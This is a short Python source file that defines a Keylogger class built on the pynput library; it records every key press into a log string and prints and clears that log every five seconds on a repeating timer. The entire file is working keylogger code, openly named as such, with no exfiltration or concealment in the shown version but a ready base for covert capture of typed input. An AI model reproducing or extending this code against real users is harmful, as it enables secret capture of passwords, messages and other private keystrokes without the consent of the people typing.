import pynput.keyboard
import threading

log = ""


class Keylogger:
    def __init__(self):
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press_2(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
               current_key = " "
            else:
               current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_Listener = pynput.keyboard.Listener(on_press=self.process_key_press_2)

        with keyboard_Listener:
            self.report()
            keyboard_Listener.join()